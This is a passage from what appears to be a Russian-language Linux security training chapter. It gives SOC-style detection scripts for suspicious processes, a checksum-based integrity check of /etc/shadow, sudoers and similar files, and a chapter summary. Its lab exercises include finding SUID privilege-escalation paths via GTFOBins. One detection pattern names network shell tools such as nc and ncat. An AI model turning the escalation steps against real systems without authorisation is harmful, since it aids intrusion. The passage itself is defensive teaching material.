# Процессы, запущенные из подозрительных мест
echo "--- Процессы из /tmp, /dev/shm, /var/tmp ---"
ps aux | awk 'NR>1 && $11 ~ /\/(tmp|dev\/shm|var\/tmp)/ {
    printf "[ПОДОЗРИТЕЛЬНО] PID=%s USER=%s CMD=%s\n", $2, $1, $11
}'

# Скрытые процессы (имя в скобках, но не ядерный поток)
echo ""
echo "--- Процессы с нестандартными именами ---"
ps aux | awk 'NR>1 && $11 ~ /^\[/ && $1 != "root" {
    printf "[ПРОВЕРИТЬ] PID=%s USER=%s CMD=%s\n", $2, $1, $11
}'

# Сетевые процессы с shell
echo ""
echo "--- Shell-процессы с сетевыми соединениями ---"
ss -tnp | grep -E "sh|bash|python|perl|ruby|nc|ncat" | while read line; do
    echo "[ПОДОЗРИТЕЛЬНО] $line"
done

# Процессы веб-сервера, породившие shell
echo ""
echo "--- Shell, порождённые веб-серверами ---"
for webuser in www-data apache nginx http; do
    ps aux | awk -v user="$webuser" '$1==user && $11 ~ /bash|sh|python/ {
        printf "[КРАСНЫЙ ФЛАГ] %s запустил: %s (PID=%s)\n", user, $11, $2
    }'
done

# Процессы без исполняемого файла (deleted binaries - признак малвари)
echo ""
echo "--- Процессы с удалёнными исполняемыми файлами ---"
ls -la /proc/*/exe 2>/dev/null | grep deleted | while read line; do
    pid=$(echo "$line" | grep -oP '(?<=/proc/)\d+')
    user=$(ps -o user= -p "$pid" 2>/dev/null)
    cmd=$(ps -o cmd= -p "$pid" 2>/dev/null)
    echo "[КРАСНЫЙ ФЛАГ] PID=$pid USER=$user CMD=$cmd (exe удалён!)"
done
```

### Проверка целостности критических файлов

```bash
#!/bin/bash
# Проверка контрольных сумм критических системных файлов

BASELINE="/etc/security/file_hashes.db"
REPORT="/tmp/integrity_check_$(date +%Y%m%d).txt"

# Список критических файлов для мониторинга
CRITICAL_FILES=(
    "/etc/passwd"
    "/etc/shadow"
    "/etc/group"
    "/etc/sudoers"
    "/etc/ssh/sshd_config"
    "/etc/crontab"
    "/bin/bash"
    "/bin/su"
    "/usr/bin/sudo"
    "/usr/bin/passwd"
)

if [ "$1" == "baseline" ]; then
    echo "Создание базовой линии..."
    > "$BASELINE"
    for file in "${CRITICAL_FILES[@]}"; do
        if [ -f "$file" ]; then
            sha256sum "$file" >> "$BASELINE"
            echo "OK: $file"
        fi
    done
    echo "Базовая линия сохранена в $BASELINE"
elif [ "$1" == "check" ]; then
    echo "Проверка целостности файлов..." | tee "$REPORT"
    echo "Время: $(date)" | tee -a "$REPORT"
    echo "" | tee -a "$REPORT"

    while IFS= read -r line; do
        expected_hash=$(echo "$line" | awk '{print $1}')
        file=$(echo "$line" | awk '{print $2}')

        if [ -f "$file" ]; then
            current_hash=$(sha256sum "$file" | awk '{print $1}')
            if [ "$current_hash" == "$expected_hash" ]; then
                echo "[OK] $file" | tee -a "$REPORT"
            else
                echo "[ИЗМЕНЁН!] $file" | tee -a "$REPORT"
                echo "  Ожидался: $expected_hash" | tee -a "$REPORT"
                echo "  Текущий:  $current_hash" | tee -a "$REPORT"
            fi
        else
            echo "[ОТСУТСТВУЕТ!] $file" | tee -a "$REPORT"
        fi
    done < "$BASELINE"
else
    echo "Использование: $0 baseline|check"
fi
```

---

## Итоги главы

В этой главе мы охватили три фундаментальные области Linux-безопасности:

**Управление процессами:**
- `ps aux` и `top`/`htop` дают полную картину запущенных процессов
- Сигналы (`kill -9`, `SIGTERM`) позволяют управлять жизненным циклом процессов
- `systemctl` управляет службами systemd — основным механизмом персистентности
- Аномальные процессы (запущенные из `/tmp`, удалённые бинарники, shell от веб-сервера) — классические индикаторы компрометации

**Пользователи и группы:**
- `/etc/passwd` доступен всем, `/etc/shadow` — только root
- Пользователь с UID=0 (кроме root) — признак взлома
- Аккаунты без пароля или с MD5-хэшами — уязвимость
- Группы `sudo`, `docker`, `disk` дают фактические права root

**Права доступа:**
- SUID на неожиданных бинарниках — самый частый вектор эскалации привилегий
- `find / -perm -4000` — обязательная команда при аудите
- Sticky bit защищает общие директории от удаления чужих файлов
- `chattr +i` защищает критические файлы от изменения даже root'ом

**sudo и sudoers:**
- `visudo` — единственный безопасный способ редактирования sudoers
- `NOPASSWD: ALL` — критическая уязвимость
- Все вызовы sudo логируются в `/var/log/auth.log`

**Ключевые команды для SOC-аналитика:**
```bash
# Быстрая проверка при подозрении на компрометацию
ps aux --forest                              # Дерево процессов
find / -perm -4000 -type f 2>/dev/null      # SUID файлы
awk -F: '$3==0' /etc/passwd                 # Пользователи с UID=0
grep "sudo\|su\|auth" /var/log/auth.log     # Попытки повышения привилегий
getcap -r / 2>/dev/null                     # Capabilities
sudo -l                                      # Права sudo текущего пользователя
```

---

## Практические задания

### Задание 1: Аудит SUID-файлов

На тестовой машине выполните:
1. Найдите все SUID-файлы в системе
2. Сравните список с эталонным (базовым) набором для вашего дистрибутива
3. Для каждого нестандартного SUID-файла определите, является ли он угрозой
4. Попробуйте через GTFOBins найти метод эскалации привилегий для одного из найденных бинарников (в лабораторной среде)

```bash
# Подсказка: начните с
find / -perm -4000 -type f 2>/dev/null | sort
```

### Задание 2: Анализ /etc/shadow

Создайте тестового пользователя с слабым паролем и:
1. Изучите запись в `/etc/shadow`
2. Определите алгоритм хэширования
3. Настройте политику паролей через `chage`
4. Убедитесь, что аккаунт системных служб имеет `!` в поле пароля

```bash
# Создать тестового пользователя
sudo useradd -m testuser
sudo passwd testuser
sudo chage -l testuser
```

### Задание 3: Безопасная настройка sudoers

Настройте систему так, чтобы:
1. Пользователь `webadmin` мог рестартовать только nginx без пароля
2. Пользователь `dbadmin` мог просматривать логи MySQL
3. Группа `developers` могла использовать `systemctl status` для любых служб
4. Проверьте настройки с помощью `sudo -l` от каждого пользователя

### Задание 4: Расследование инцидента

**Сценарий:** Система ведёт себя странно. Нагрузка CPU высокая, пользователи жалуются на медленную работу.

Выполните следующие шаги и задокументируйте находки:
1. `ps aux --sort=-%cpu | head -20` — найти процессы с высоким CPU
2. `ps axjf` — построить дерево процессов, найти аномалии
3. `ls -la /proc/<PID>/exe` — проверить путь исполняемого файла
4. `find / -perm -4000 -newer /etc/passwd` — найти новые SUID-файлы
5. `last -20` — проверить последние входы
6. `grep "sudo\|su" /var/log/auth.log | tail -50` — проверить эскалации

### Задание 5: Скрипт мониторинга

Напишите bash-скрипт, который:
1. Каждые 60 секунд проверяет список SUID-файлов
2. Сравнивает с эталонным списком
3. При обнаружении нового SUID-файла отправляет алерт (запись в лог + echo)
4. Логирует все изменения с временными метками

```bash
#!/bin/bash
# Шаблон для старта:
BASELINE="/tmp/suid_baseline.txt"
LOGFILE="/var/log/suid_monitor.log"

create_baseline() {
    find / -perm -4000 -type f 2>/dev/null | sort > "$BASELINE"
    echo "$(date): Базовая линия создана ($(wc -l < $BASELINE) файлов)"
}

check_changes() {
    current=$(find / -perm -4000 -type f 2>/dev/null | sort)
    # Ваш код здесь...
}

# TODO: добавить цикл мониторинга
```
